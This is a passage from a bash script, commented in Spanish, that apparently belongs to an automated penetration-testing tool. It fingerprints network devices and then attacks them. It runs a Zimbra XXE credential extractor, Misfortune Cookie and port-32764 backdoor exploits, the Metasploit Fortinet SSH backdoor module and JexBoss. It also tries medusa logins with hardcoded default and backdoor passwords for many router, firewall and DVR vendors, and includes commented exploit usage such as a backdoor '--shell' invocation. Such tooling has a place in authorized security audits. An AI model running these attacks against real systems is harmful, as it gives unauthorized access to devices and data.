	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/upnp.txt; sort ../.servicios/upnp.txt | uniq >../.servicios/upnp2.txt ; mv ../.servicios/upnp2.txt ../.servicios/upnp.txt
	
	### Revisar certificados SSL, Titulos web ##
	cd ..
	cd .enumeracion2/
	touch canary.txt # es necesario que exista al menos 2 archivos 
	#phpmyadmin
	grep --color=never -i admin *webarchivos.txt 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
	
	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
	
	
	#fortinet
	grep --color=never -i forti * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/fortinet2.txt
	sort ../.servicios/fortinet2.txt | uniq > ../.servicios/fortinet.txt
	rm ../.servicios/fortinet2.txt
	
	#3com
	grep --color=never -i 3com * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/3com2.txt
	sort ../.servicios/3com2.txt | uniq > ../.servicios/3com.txt
	rm ../.servicios/3com2.txt
	
	#d-link
	grep --color=never -i d-link * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/d-link2.txt
	sort ../.servicios/d-link2.txt | uniq > ../.servicios/d-link.txt
	rm ../.servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/linksys2.txt
	sort ../.servicios/linksys2.txt | uniq > ../.servicios/linksys.txt
	rm ../.servicios/linksys2.txt
		
	
	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/ubiquiti.txt
	
	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/pfsense.txt
	
	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/PRTG.txt
	
	#ZKsoftware
	grep --color=never -i ZK * 2>/dev/null | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZKSoftware.txt		
	
	#ZTE
	grep --color=never -i ZTE * 2>/dev/null | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZTE2.txt
	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt 
	rm ../.servicios/ZTE2.txt
		
	
	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/zimbra.txt		
	
	#jboss
	grep --color=never -i jboss * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/jboss.txt
	
	#401
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "-" -f1  > ../.servicios/web401-2.txt
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "-" -f1  > ../.servicios/web401-2.txt
	# sort
	sort ../.servicios/web401-2.txt | uniq > ../.servicios/web401.txt
	rm ../.servicios/web401-2.txt
	
	cd ..
	################################

find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null



# UPNP
if [ -f .servicios/upnp.txt ]
then
	echo -e "$OKBLUE #################### UPnP (`wc -l .servicios/upnp.txt`) ######################$RESET"
	for line in $(cat .servicios/upnp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"		
		upnp_info.py $ip  >> logs/vulnerabilidades/$ip-upnp-enum.txt 2>/dev/null &					
	done
	
	
	# revisar si hay scripts ejecutandose
	while true; do
	upnp_instancias=`ps aux | egrep 'upnp_info.py' | wc -l`		
	if [ "$upnp_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($upnp_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true		
	
	# Revisar si se detecto servicios upnp
	for line in $(cat .servicios/upnp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		
					
		egrep -iq "http" logs/vulnerabilidades/$ip-upnp-enum.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Servicio upnp descubierto \n $RESET"
			cp logs/vulnerabilidades/$ip-upnp-enum.txt .vulnerabilidades/$ip-upnp-enum.txt
		fi														
	done		
	
	#insert clean data	
	insert_data	
fi


#zimbra
if [ -f .servicios/zimbra.txt ]
then
	echo -e "$OKBLUE #################### zimbra (`wc -l .servicios/zimbra.txt`) ######################$RESET"	    	
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"					
		echo "zimbraXXE.py https://$ip:$port" > logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
		zimbraXXE.py https://$ip:$port  >> logs/vulnerabilidades/$ip-$port-zimbraXXE.txt 2>/dev/null		
		grep -i "credenciales" logs/vulnerabilidades/$ip-$port-zimbraXXE.txt  > .vulnerabilidades/$ip-$port-zimbraXXE.txt 															
		 echo ""
 	done <.servicios/zimbra.txt
	#insert clean data	
	insert_data	
fi


#cisco
if [ -f .servicios/ciscoASA.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/ciscoASA.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:443"		
		echo "nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
		nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
		grep "|" logs/vulnerabilidades/$ip-cisco-vuln.txt  > .vulnerabilidades/$ip-cisco-vuln.txt
		
#		nmap -n -Pn  -p 443 --script http-vuln-cve2014-2129 $ip > logs/vulnerabilidades/$ip-cisco-dos.txt 2>/dev/null		
		#grep "|" logs/vulnerabilidades/$ip-cisco-dos.txt  > .vulnerabilidades/$ip-cisco-dos.txt
													 
		 echo ""
 	done <.servicios/ciscoASA.txt
	#insert clean data	
	insert_data	
fi

#cisco
if [ -f .servicios/cisco.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/cisco.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip"
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-cisco.txt > .vulnerabilidades/$ip-admin-cisco.txt
		echo ""													 		
 	done <.servicios/cisco.txt
	#insert clean data	
	insert_data	
fi


#samba
if [ -f .servicios/samba.txt ]
then
	echo -e "$OKBLUE #################### samba (`wc -l .servicios/samba.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:445"		
		echo "nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/$ip-samba-vuln.txt 2>/dev/null
		nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/$ip-samba-vuln.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-samba-vuln.txt  > .vulnerabilidades/$ip-samba-vuln.txt
		#scanner/smb/smb_uninit_cred											 
		 echo ""
 	done <.servicios/samba.txt
	#insert clean data	
	insert_data	
fi

#RomPager
if [ -f .servicios/RomPager.txt ]
then
	echo -e "$OKBLUE #################### RomPager (`wc -l .servicios/RomPager.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip:80"	
		misfortune_cookie.pl -target $ip -port 80 > logs/vulnerabilidades/$ip-80-misfortune.txt 2>/dev/null 
		grep --color=never "bimqODoXWaTzdFnh" logs/vulnerabilidades/$ip-80-misfortune.txt > .vulnerabilidades/$ip-80-misfortune.txt 2>/dev/null 
													 
		 echo ""
 	done <.servicios/RomPager.txt
	#insert clean data	
	insert_data	
	
	#exploit 
	#use auxiliary/admin/http/allegro_rompager_auth_bypass
fi


# cisco backdoor

if [ -f .servicios/backdoor32764.txt ]
then
	echo -e "$OKBLUE #################### Cisco linksys WAG200G backdoor (`wc -l .servicios/backdoor32764.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip:32764"	
		backdoor32764.py --ip $ip > logs/vulnerabilidades/$ip-32764-ciscoBackdoor.txt 2>/dev/null
		grep "is vulnerable" logs/vulnerabilidades/$ip-32764-ciscoBackdoor.txt  > .vulnerabilidades/$ip-32764-ciscoBackdoor.txt
		# exploit		
		# backdoor32764.py --ip 192.168.0.1 --shell

		 echo ""
 	done <.servicios/backdoor32764.txt
	#insert clean data	
	insert_data	
fi


# fortigate backdoor

if [ -f .servicios/fortinet.txt ]
then
	echo -e "$OKBLUE #################### fortinet (`wc -l .servicios/fortinet.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"		
		
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p 'bcpb+serial#' -M telnet >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p 'bcpb+serial#' -M ssh >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-fortinet.txt 2>/dev/null
			
			msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/$ip-22-fortigateBackdoor.txt 2>/dev/null		
			sleep 5
			grep --color=never -i "Logged" logs/vulnerabilidades/$ip-22-fortigateBackdoor.txt  > .vulnerabilidades/$ip-22-fortigateBackdoor.txt
		fi					
						
		 echo ""
 	done <.servicios/fortinet.txt
	#exploit 
	# cd /opt/backdoors/
	# python fortigate.py 192.168.0.1
	
	#insert clean data	
	insert_data	
fi

# Juniper 
if [ -f .servicios/NetScreen.txt ]
then
	echo -e "$OKBLUE #################### NetScreen - Juniper (`wc -l .servicios/NetScreen.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"
		
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"			
			medusa -h $ip -u admin -p abc123 -M telnet >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -h $ip -u super -p juniper123 -M telnet >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null						
			medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p abc123 -M ssh >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -h $ip -u super -p juniper123 -M ssh >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null						
			medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
			medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-juniper.txt 2>/dev/null
		fi					
					
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-juniper.txt > .vulnerabilidades/$ip-admin-juniper.txt 
		echo ""
 	done <.servicios/NetScreen.txt
	#exploit 
	# ssh root@192.168.0.1  pass=<<< %s(un='%s') = %u	
	#insert clean data	
	insert_data
fi

# zyxel default password
if [ -f .servicios/zyxel.txt ]
then
	echo -e "$OKBLUE #################### zyxel (`wc -l .servicios/zyxel.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p user -M telnet >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p user -M ssh >> logs/vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-zyxel.txt > .vulnerabilidades/$ip-admin-zyxel.txt 2>/dev/null
		echo ""
 	done <.servicios/zyxel.txt	
	insert_data
fi


# mikrotik default password
if [ -f .servicios/mikrotik.txt ]
then
	echo -e "$OKBLUE #################### mikrotik (`wc -l .servicios/mikrotik.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-mikrotik.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-mikrotik.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-mikrotik.txt > .vulnerabilidades/$ip-admin-mikrotik.txt
		echo ""
 	done <.servicios/mikrotik.txt	
	insert_data
fi

# ubiquiti default password
if [ -f .servicios/ubiquiti.txt ]
then
	echo -e "$OKBLUE #################### ubiquiti (`wc -l .servicios/ubiquiti.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
			medusa -h $ip -u root -p ubnt -M telnet >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
			medusa -h $ip -u ubnt -p ubnt -M telnet >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
			medusa -h $ip -u root -p ubnt -M ssh >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
			medusa -h $ip -u ubnt -p ubnt -M ssh >> logs/vulnerabilidades/$ip-admin-ubiquiti.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ubiquiti.txt > .vulnerabilidades/$ip-admin-ubiquiti.txt
		echo ""
 	done <.servicios/ubiquiti.txt	
	insert_data
fi


# dahua default password
if [ -f .servicios/dahua.txt ]
then
	echo -e "$OKBLUE #################### dahua (`wc -l .servicios/dahua.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
			echo -e "\t[+] Probando password por defecto"
			echo "medusa -u root -p vizxv -h $ip -M telnet" > logs/vulnerabilidades/$ip-23-passworddahua-dvr.txt 2>/dev/null
			medusa -u root -p vizxv -h $ip -M telnet >> logs/vulnerabilidades/$ip-23-passworddahua-dvr.txt 2>/dev/null
			
			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passworddahua-dvr.txt > .vulnerabilidades/$ip-23-passworddahua-dvr.txt 
			
			#echo "medusa -e n -u root -h $ip -M telnet" > logs/vulnerabilidades/$ip-23-passwordTelnet.txt 2>/dev/null
			#medusa -e n -u root -h $ip -M telnet >> logs/vulnerabilidades/$ip-23-passwordTelnet.txt 2>/dev/null
			
			#echo "medusa -e n -u admin -h $ip -M telnet" >> logs/vulnerabilidades/$ip-23-passwordTelnet.txt 2>/dev/null
			#medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/$ip-23-passwordTelnet.txt 2>/dev/null
			
			
			#grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-password.txt 2>/dev/null > .vulnerabilidades/$ip-23-password.txt		
 	done <.servicios/dahua.txt	
	insert_data
fi

	
			
			
# pfsense default password
if [ -f .servicios/pfsense.txt ]
then
	echo -e "$OKBLUE #################### pfsense (`wc -l .servicios/pfsense.txt`) ######################$RESET"	    
	while read line     
	do     						
		echo -e "[+] Escaneando $line"	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p pfsense -M ssh >> logs/vulnerabilidades/$ip-admin-pfsense.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-pfsense.txt > .vulnerabilidades/$ip-pfsense-passwordDefecto.txt
		echo ""
 	done <.servicios/pfsense.txt	
	insert_data
fi

# JBOSS
if [ -f .servicios/jboss.txt ]
then
	echo -e "$OKBLUE #################### jboss (`wc -l .servicios/jboss.txt`) ######################$RESET"	    
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"	
		if [[ $port == "443" || $port == "8443"  ]]
		then 
			jexboss.sh --disable-check-updates -u "https://$line" > logs/vulnerabilidades/$ip-$port-jbossVuln.txt
		else
			jexboss.sh --disable-check-updates -u "http://$line"  > logs/vulnerabilidades/$ip-$port-jbossVuln.txt		
		fi
						
		egrep --color=never "VULNERABLE|EXPOSED|INCONCLUSIVE" logs/vulnerabilidades/$ip-$port-jbossVuln.txt > .vulnerabilidades/$ip-$port-jbossVuln.txt
		echo ""
 	done <.servicios/jboss.txt	
	insert_data
fi


# Netgear default password
if [ -f .servicios/Netgear.txt ]
then
	echo -e "$OKBLUE #################### Netgear (`wc -l .servicios/Netgear.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null			
			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-Netgear.txt > .vulnerabilidades/$ip-netgear-passwordDefecto.txt
		echo ""
 	done <.servicios/Netgear.txt	
	insert_data
fi


# linksys default password
if [ -f .servicios/linksys.txt ]
then
	echo -e "$OKBLUE #################### linksys (`wc -l .servicios/linksys.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
			medusa -h $ip -u admin -p password -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
			medusa -h $ip -u root -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
			medusa -e n -u linksys -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
			medusa -h $ip -u admin -p password -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
			medusa -h $ip -u root -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
			medusa -e n -u linksys -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-linksys.txt > .vulnerabilidades/$ip-linksys-passwordDefecto.txt
		echo ""
 	done <.servicios/linksys.txt	
	insert_data
fi



# d-link default password
if [ -f .servicios/d-link.txt ]
then
	echo -e "$OKBLUE #################### d-link (`wc -l .servicios/d-link.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
			medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-dlink.txt > .vulnerabilidades/$ip-dlink-passwordDefecto.txt
		echo ""
 	done <.servicios/d-link.txt	
	insert_data
fi



# tp-link default password
if [ -f .servicios/tp-link.txt ]
then
	echo -e "$OKBLUE #################### tp-link (`wc -l .servicios/tp-link.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-tplink:23-passwordDefecto.txt 2>/dev/null			
			
		fi		

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-tplink.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-tplink.txt > .vulnerabilidades/$ip-tplink:22-passwordDefecto.txt
		echo ""
 	done <.servicios/tp-link.txt	
	insert_data
fi


# ZTE default password
if [ -f .servicios/ZTE.txt ]
then
	echo -e "$OKBLUE #################### ZTE (`wc -l .servicios/ZTE.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u zte -p zte -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u ZXDSL -p ZXDSL -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u user -p user -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u on -p on -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			
			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-admin-ZTE.txt 2>dev/null
			cp logs/vulnerabilidades/$ip-admin-ZTE.txt .vulnerabilidades/$ip-zte:23-passwordDefecto.txt
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo			

		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u zte -p zte -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u ZXDSL -p ZXDSL -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u user -p user -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u on -p on -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u root -p Zte521 -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			medusa -h $ip -u root -p 'W!n0&oO7.' -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
			
			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-admin-ZTE.txt 2>dev/null
			cp logs/vulnerabilidades/$ip-admin-ZTE.txt .vulnerabilidades/$ip-zte:22-passwordDefecto.txt
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo	
		
		
		egrep -iq "80/open" .nmap_1000p/$ip-tcp.grep
		greprc=$?
